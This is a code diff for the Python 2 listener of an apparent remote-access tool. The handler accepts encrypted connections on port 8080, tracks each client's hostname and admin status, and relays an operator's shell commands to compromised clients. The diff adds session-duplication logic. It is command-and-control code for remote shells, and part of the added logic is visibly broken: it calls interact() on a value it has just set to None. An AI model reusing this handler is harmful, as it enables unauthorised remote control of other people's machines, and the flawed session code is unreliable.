@@ -233,6 +233,9 @@ class Transport:
 			if signal == "CREATE_CHANNEL":
 				pass
 				
+			elif signal == "NEW_SESH":
+				self.user_channel.write_input("AWAIT_NEW_SESH")
+				
 	def signal(self, data):
 		logging.debug("Sending signal to client #"+str(self.client_id)+": "+data[:100])
 		self.master_queue.put(self.signal_channel.id+data)
@@ -251,14 +254,16 @@ class Client:
 	"""
 	Represents a connected client.
 	"""
-	def __init__(self, id, cli, ip, port, aes_obj, hostname, admin):
+	def __init__(self, id, cli, ip, port, aes_obj, hostname, admin, handler):
 		self.transport = Transport(cli, ip, port, id, aes_obj, self)
 		self.id = id
 		self.proxy_listener = None
 
-                self.ip = ip
+		self.ip = ip
 		self.hostname = hostname
 		self.admin_privs = admin
+		
+		self.handler = handler
 		
 	def send(self, data):
 		self.transport.user_channel.write_output(data)
@@ -330,6 +335,7 @@ class Client:
 		
 
 	def interact(self):
+	
 		logging.info("Starting interaction with client #"+str(self.id))
 		self.send("cd .")
 		cwd = self.recv()
@@ -337,7 +343,7 @@ class Client:
 			print BAD + "Client Disconnected"
 			return False			
 		sys.stdout.write(cwd)
-		
+			
 		while True:
 			try:
 				user_input = raw_input()
@@ -377,10 +383,13 @@ class Client:
 			if data == "CONN_LOST":
 				print BAD + "Client Disconnected"
 				return False
-			elif data.startswith("BG_NEW_SESH"):
-				print "\n" + GOOD + "A new session should appear within 30 seconds. (Try checking, it might have already connected!)"
+			#elif data.startswith("BG_NEW_SESH"):
+				#print "\n" + GOOD + "A new session should appear within 30 seconds. (Try checking, it might have already connected!)"
+				#return True
+			elif data.startswith("AWAIT_NEW_SESH"):
+				print "let's wait for a bit, ok?"
+				self.handler.awaiting_session = True
 				return True
-
 			data = data.replace("[-]", BAD).replace("[+]", GOOD).replace("[*]", INFO)
 			sys.stdout.write(data)
 		
@@ -397,10 +406,12 @@ class Handler:
 		self.sock.listen(5)
 	
 		self.clients = []
-	        self.dup_session = 9040
 
 		self.interacting = False
 		self.current_id = 0
+		self.dup_session = None
+		self.awaiting_session = False
+		self.session_on_hold = None
 		
 	def dh_exchange(self, client):
 		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
@@ -441,16 +452,15 @@ class Handler:
 				aes = self.dh_exchange(cli)
 				
 				hostname, admin = cli.recv(4096).split("|")
-				c = Client(id, cli, address, port, aes, hostname, admin)
+				c = Client(id, cli, address, port, aes, hostname, admin, self)
 				
-
-                                for client in self.clients:
-                                    if client.hostname == hostname and client.ip == address and not self.interacting:
-                                        print "Attaching to new session"
-                                        self.dup_session = c.id
+				for client in self.clients:
+					if client.hostname == hostname and client.ip == address and not self.interacting and self.awaiting_session:
+						print "Attaching to new session"
+						self.dup_session = c
 
 				self.clients.append(c)
-				if not self.interacting:
+				if not self.interacting and not self.awaiting_session:
 					sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
 					print INFO + "STELF session "+str(c.id)+" opened ("+address+":"+str(port)+" -> "+self.bind_addr+":"+str(self.bind_port)+")\n"
 					sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
@@ -463,19 +473,27 @@ class Handler:
 		t.daemon = True
 		t.start()
 		while True:
-		        if self.dup_session != 9040:
-                            self.interacting = True
-                            try:
-                                dup = [c for c in self.clients if c.id == int(self.dup_session)][0]
-                                self.dup_session = 9040
-                            except:
-                                print BAD + "No such client."
-                                continue
-
-                            if not dup.interact(): 
-                                self.clients.remove(the_chosen_one)
-                                self.interacting = False
-
+			if self.awaiting_session:
+				for i in range(30):
+					if self.dup_session:
+						self.interacting = True
+						self.session_on_hold = None
+						self.awaiting_session = False
+						print "yay!"
+						self.dup_session.interact()
+						self.dup_session = None
+					else: time.sleep(1)
+				
+				if not self.interacting:
+					print "nope"
+					self.interacting = True
+					self.session_on_hold = None
+					self.awaiting_session = False
+					self.session_on_hold.interact()
+					
+				self.interacting = False
+				continue
+				
 			try: user_input = raw_input(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> ")
 			except KeyboardInterrupt:
 				print "\n" + GOOD + "Bye!"
@@ -497,10 +515,10 @@ class Handler:
 					print BAD + "No such client."
 					continue
 				if not the_chosen_one.interact(): self.clients.remove(the_chosen_one)
+				else:
+					if self.awaiting_session:
+						self.session_on_hold = the_chosen_one
 				self.interacting = False
 		
-def main():
-	Handler("0.0.0.0",8080).run()
-	
-if __name__ == "__main__":
-	main()
+handler = Handler("0.0.0.0",8080).run()
+
